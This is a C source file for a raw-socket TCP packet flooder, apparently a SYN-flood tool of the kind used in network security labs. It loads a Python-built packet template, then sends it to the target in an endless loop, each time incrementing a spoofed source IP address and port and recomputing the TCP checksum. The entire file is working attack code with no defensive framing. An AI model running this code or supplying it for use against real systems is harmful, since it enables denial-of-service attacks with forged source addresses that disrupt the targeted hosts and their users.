#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#define FILE_SIZE 50

//For calculating TCP checksum
struct pseudo_hdr
{
    uint32_t src_ip;
    uint32_t dst_ip;
    uint8_t reserved;
    uint8_t protocol;
    uint16_t tcp_len;

    struct tcphdr tcph;
};

uint16_t chksum(const uint16_t *ptr, int len){
    uint32_t sum;
    uint16_t oddbyte;
    uint16_t answer;

    sum = 0;
    while(len > 1){
        sum+=*ptr++;
        len-=2;
    }
    if(len == 1){
        oddbyte = 0;
        *((uint8_t *) &oddbyte) = *(uint8_t*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return(answer);
}

int main(void){
    //Read packet created by Python
    FILE *f = fopen("packet", "rb");
    uint8_t *fbuf = (uint8_t *) malloc(FILE_SIZE);
    size_t flen = fread(fbuf, 1, FILE_SIZE,f);

    struct ip *iphdr = (struct ip *) fbuf;
    char ip_str[INET_ADDRSTRLEN];

    //Read the target ip addr, and print out for double check
    inet_ntop(AF_INET, &(iphdr->ip_dst), ip_str, INET_ADDRSTRLEN);
    printf("from template: using dst = %s\n", ip_str);
    char *target = ip_str;

    //Create RAW socket
    int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Tell kernel that we will construct the header
    int _one = 1;
    const int *one = &_one;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, one, sizeof(_one)) < 0){
        printf("Error setting socket");
        exit(0);
    }

    //Define a new packet based on python created packet
    char *packet = fbuf;
    char src_ip[32];

    //Define headers
    struct iphdr *iph = (struct iphdr*) packet;
    struct tcphdr *tcph = (struct tcphdr*) (packet + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_hdr psh;
    
    //Setting up socket
    sin.sin_family = AF_INET;
    sin.sin_port = tcph->dest;
    sin.sin_addr.s_addr = inet_addr(target);

    //Fill TCP Pseudo header
    psh.src_ip = iph->saddr;
    psh.dst_ip = iph->daddr;
    psh.reserved = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_len = htons(20);

    while(1){
        //Increase the source ip and port
        tcph->check = 0;
        iph->saddr = iph->saddr + 1;
        tcph->source = tcph->source + 1;
        psh.src_ip = iph->saddr;
        //Calculate the updated checksum for TCP
        memcpy(&psh.tcph, tcph, sizeof(struct tcphdr));
        tcph->check = chksum((uint16_t *)&psh, sizeof(struct pseudo_hdr));

        //Send out the packet
        if(sendto(sock, packet, flen, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
            printf("Error sending packet\n");
            exit(0);
        }
        else{
            printf(".");
        }
    }
    return 0;
}